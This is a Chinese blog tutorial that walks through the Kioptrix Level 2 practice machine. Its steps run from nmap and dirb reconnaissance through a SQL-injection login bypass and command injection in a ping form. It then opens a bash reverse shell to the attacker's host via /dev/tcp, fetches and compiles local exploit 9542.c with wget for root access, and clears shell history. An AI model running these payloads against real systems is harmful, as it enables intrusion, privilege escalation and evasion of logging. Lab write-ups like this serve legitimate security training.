
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/GuijiH6/p/18625220" title="发布于 2024-12-24 13:19">
    <span role="heading" aria-level="2">#渗透测试 kioptix level 2靶机通关教程及提权</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p>声明！<br>
文章所提到的网站以及内容，只做学习交流，其他均与本人以及泷羽sec团队无关，切勿触碰法律底线，否则后果自负！！！！</p>
</blockquote>
<p>工具链接：<a href="https://pan.quark.cn/s/530656ba5503" target="_blank" rel="noopener nofollow">https://pan.quark.cn/s/530656ba5503</a></p>
<h1 id="一准备阶段">一、准备阶段</h1>
<p>复现请将靶机ip换成自己的</p>
<blockquote>
<p>kali: 192.168.108.130</p>
<p>靶机：192.168.108.136</p>
</blockquote>
<h2 id="1-找出ip端口和服务信息">1. 找出ip端口和服务信息</h2>
<h3 id="扫出ip">扫出ip</h3>
<pre><code>nmap -sn 192.168.108.0/24
</code></pre>
<p><img src="https://files.mdnice.com/user/81572/d1390650-7a42-4eeb-a3e8-59b9c0986b21.png" alt="" loading="lazy"></p>
<h3 id="扫出端口">扫出端口</h3>
<pre><code>nmap -p 1-65535 192.168.108.136
</code></pre>
<p><img src="https://files.mdnice.com/user/81572/a1221b9c-6a3a-4502-aec7-ed894bf5383a.png" alt="" loading="lazy"></p>
<p>一般扫描出端口后，尝试去访问web页面，但是只有一个登录界面</p>
<p><img src="https://files.mdnice.com/user/81572/975d11c0-1aec-47fb-a988-1fd68d3c9e9a.png" alt="" loading="lazy"></p>
<h3 id="端口对应服务信息">端口对应服务信息</h3>
<pre><code>nmap -sV 192.168.108.136
</code></pre>
<p>服务信息</p>
<pre><code>22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind  2 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
631/tcp  open  ipp      CUPS 1.1
3306/tcp open  mysql    MySQL (unauthorized)
</code></pre>
<p>可利用信息</p>
<blockquote>
<p>OpenSSH 3.9p1</p>
<p>Apache httpd 2.0.52</p>
<p>MySQL (unauthorized)</p>
<p>CUPS 1.1</p>
</blockquote>
<h2 id="2-目录扫描">2. 目录扫描</h2>
<pre><code>dirb http://192.168.108.136/
</code></pre>
<p>可以看到扫出很多目录，但都是在<strong><a href="http://192.168.108.136/manual" target="_blank" rel="noopener nofollow">http://192.168.108.136/manual</a></strong> 这个大目录下</p>
<p><img src="https://files.mdnice.com/user/81572/245ff946-fb2d-4705-9069-b117da36d145.png" alt="" loading="lazy"></p>
<p>访问此目录<strong><a href="http://192.168.108.136/manual" target="_blank" rel="noopener nofollow">http://192.168.108.136/manual</a></strong>,寻找可能利用的信息</p>
<h2 id="3-漏洞扫描">3. 漏洞扫描</h2>
<h3 id="nmap扫描漏洞">nmap扫描漏洞</h3>
<pre><code>nmap 192.168.108.136 -p 22,80,111,443,631,3306 -oA --script=vuln
</code></pre>
<p>会有很多漏洞</p>
<h3 id="searchsploit查找漏洞">searchsploit查找漏洞</h3>
<pre><code>searchsploit Apache httpd 2.0.52
searchsploit OpenSSH 3.9p1
searchsploit MySQL (unauthorized)
searchsploit CUPS 1.1
</code></pre>
<h1 id="二获取权限">二、获取权限</h1>
<h2 id="1-访问web服务">1. 访问web服务</h2>
<p><img src="https://files.mdnice.com/user/81572/78275235-cadf-4e5a-aa48-1aac999f755e.png" alt="" loading="lazy"></p>
<p>结合开放的<strong>mysql3306</strong>端口，可以尝试sql注入攻击，<br>
输入万能密码尝试</p>
<p><img src="https://files.mdnice.com/user/81572/9e83162c-f19f-41e7-845b-f1dea7006989.png" alt="" loading="lazy"></p>
<p>出现以下界面</p>
<p><img src="https://files.mdnice.com/user/81572/7779da4e-a16f-42d2-9361-682f88db13e2.png" alt="" loading="lazy"></p>
<p>可以看到是要进行ping命令，但是没有ping的框架，<br>
查看源代码发现以下信息</p>
<p><img src="https://files.mdnice.com/user/81572/bbddb22f-724c-4b3f-aa1b-c67ac17da548.png" alt="" loading="lazy"></p>
<p>发现登录框被闭合了</p>
<h3 id="方法1">方法1</h3>
<p>打开burpsuite抓包，在拦截设置，选择拦截响应包</p>
<p><img src="https://files.mdnice.com/user/81572/1e17d3bb-7a68-4111-9df4-6203b14fc23b.png" alt="" loading="lazy"></p>
<p>点击此处，然后关闭拦截即可</p>
<p><img src="https://files.mdnice.com/user/81572/e92b7f7d-d177-4592-bf6a-135e4517fe9f.png" alt="" loading="lazy"><br>
删除' 然后放包</p>
<p><img src="https://files.mdnice.com/user/81572/4fe1bd8f-0063-4473-8cb7-90077deedbd9.png" alt="" loading="lazy"></p>
<p>此时就可以进行ping了</p>
<h3 id="方法2">方法2</h3>
<p>找到需要插入的地方，右键<strong>编辑html</strong>将代码复制到这里，并将<strong>align='center&gt;</strong>修改<strong>align="center"&gt;</strong></p>
<p><img src="https://files.mdnice.com/user/81572/7a11f7d6-3adf-48e0-a3b9-5b68f8f24dc0.png" alt="" loading="lazy"></p>
<p>可以看到也是可以的</p>
<p><img src="https://files.mdnice.com/user/81572/db8a5977-4065-4565-9b89-57b290f9644f.png" alt="" loading="lazy"></p>
<h2 id="2-ping命令">2. ping命令</h2>
<p>在ping之前先了解一下url中的的一些符号</p>
<pre><code>;     前面的执行完执行后面的
|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         
||    当前面的执行出错时（为假）执行后面的
&amp;     将任务置于后台执行
&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真
%0a  （换行）
%0d  （回车）
</code></pre>
<p>ping靶机</p>
<p><img src="https://files.mdnice.com/user/81572/5ace0e7b-ad1d-452c-8a6e-2eeb6db6a40b.png" alt="" loading="lazy"></p>
<p>输入以下命令</p>
<pre><code>192.168.108.136;ls
</code></pre>
<p><img src="https://files.mdnice.com/user/81572/41ed6d68-ff04-4102-bbe1-4ccea959f1f3.png" alt="" loading="lazy"></p>
<p>发现成功回显，并且经过测试，并不存在过滤的情况</p>
<h2 id="3-反弹shell">3. 反弹shell</h2>
<p>这里我们使用bash反弹</p>
<p>开启监听端口，端口选用kali空闲端口即可</p>
<pre><code>nc -lvvp 4444
</code></pre>
<p><img src="https://files.mdnice.com/user/81572/d0737198-44ba-425d-b6ae-63b532d70b40.png" alt="" loading="lazy"></p>
<p>执行以下代码</p>
<pre><code>127.0.0.1;bash -i &gt;&amp; /dev/tcp/192.168.108.130/4444 0&gt;&amp;1
/dev/tcp/你的kali的ip/开启的端口
</code></pre>
<p>可以看到反弹成功</p>
<p><img src="https://files.mdnice.com/user/81572/d9d2aaf1-445a-49c4-9940-8275b5ed3a59.png" alt="" loading="lazy"></p>
<h1 id="三提权">三、提权</h1>
<p>查询版本信息</p>
<pre><code>uname -a
lsb_release -a
</code></pre>
<p>信息如下</p>
<p><img src="https://files.mdnice.com/user/81572/914382e8-17c8-476e-829f-68b955dedd3c.png" alt="" loading="lazy"></p>
<pre><code>Linux kioptrix.level2 2.6.9-55.EL
Distributor ID: CentOS
Description:    CentOS release 4.5 (Final)
Release:        4.5
</code></pre>
<p>可以知道是<strong>centos4.5</strong>版本，查找该版本漏洞</p>
<p>找到漏洞利用脚本</p>
<p><img src="https://files.mdnice.com/user/81572/320d24a6-616a-49d2-b71e-94a6dde297c4.png" alt="" loading="lazy"></p>
<p>利用searchsploit命令下载脚本，这里可以看我之前总结的命令使用详情<br>
<a href="https://blog.csdn.net/m0_74786138/article/details/144266845?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=144266845&amp;sharerefer=PC&amp;sharesource=m0_74786138&amp;sharefrom=from_link" target="_blank" rel="noopener nofollow">searchsploit命令大全</a></p>
<pre><code>searchsploit centos 4.5 -m 9542.c  
</code></pre>
<p>下载成功</p>
<p><img src="https://files.mdnice.com/user/81572/217bd81b-c3d1-4ac0-9d3f-5b583d37f1df.png" alt="" loading="lazy"></p>
<p>开启web服务</p>
<pre><code>sudo python -m http.server 80
</code></pre>
<p>成功上传</p>
<p><img src="https://files.mdnice.com/user/81572/f414f296-e1b4-430f-940c-16e2a1c5770b.png" alt="" loading="lazy"></p>
<p>在目标主机上下载脚本</p>
<pre><code>cd /tmp
wget http://192.168.108.130:80/9542.c
</code></pre>
<p>下载成功</p>
<p><img src="https://files.mdnice.com/user/81572/389fe4a3-8188-48ca-b6be-c88b907241ad.png" alt="" loading="lazy"></p>
<p>编译脚本</p>
<pre><code>gcc 9542.c
chamod 777 a.out
./a.out
</code></pre>
<p>提权成功</p>
<p><img src="https://files.mdnice.com/user/81572/e0d5fa66-e6dc-4eaa-a74f-d0cdbf765e30.png" alt="" loading="lazy"></p>
<p>可以看到是有命令记录的，为了更严谨，最后每次复现完，退出的时候清除历史命令</p>
<pre><code>history -c
</code></pre>
<p><img src="https://files.mdnice.com/user/81572/a1a9adb8-0d6c-402c-8d38-3a62e7763da7.png" alt="" loading="lazy"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.042007058450231484" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2024-12-24 13:20">2024-12-24 13:19</span>&nbsp;
<a href="https://www.cnblogs.com/GuijiH6">H轨迹H</a>&nbsp;
阅读(<span id="post_view_count">23</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18625220" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18625220);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18625220', targetLink: 'https://www.cnblogs.com/GuijiH6/p/18625220', title: '#渗透测试 kioptix level 2靶机通关教程及提权' })">举报</a>
</div>
        